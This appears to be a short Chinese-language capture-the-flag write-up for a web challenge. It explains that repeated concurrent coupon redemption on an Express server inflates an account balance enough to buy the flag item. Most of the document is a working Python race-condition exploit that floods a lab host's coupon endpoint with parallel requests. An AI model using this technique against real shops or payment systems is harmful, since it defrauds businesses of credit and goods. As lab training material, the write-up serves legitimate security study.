## 分析

服务器使用的是`express`搭建的，是一个单线程，所以思路是利用条件竞争，来给我们的账户进行充值

首先在`purchase`接口处获取`session`来创建一个用户

然后使用这个`session`来进行充值，这里使用多进程，从代码中当`purchase`的`item`为`C8`的时候即可获得`flag`

```python
#!/usr/bin/env python

from concurrent.futures import process
from email import header
from multiprocessing import Process, Pool
from threading import Thread
import requests

def race(cookie):
    headers = {
        'Cookie': f'session={cookie}'
    }
    try:
        req = requests.post('http://157.245.46.136:31516/api/coupons/apply', data={'coupon_code': 'HTB_100'}, headers=headers)
        print(req.text)
    except Exception:
        pass


if __name__ == '__main__':
    req = requests.post('http://157.245.46.136:31516/api/purchase', data={'item': 'C8'})
    cookie = req.cookies['session']
    ps = []
    for x in range(16):
        p = Process(target=race, args=(cookie, ))
        ps.append(p)

    for p in ps:
        p.start()

    for p in ps:
        p.join()

    req = requests.post('http://157.245.46.136:31516/api/purchase', data={'item': 'B5'}, headers={'Cookie': f'session={cookie}'})
    print(req.text)

    req = requests.post('http://157.245.46.136:31516/api/purchase', data={'item': 'C8'}, headers={'Cookie': f'session={cookie}'})
    print(req.text)
```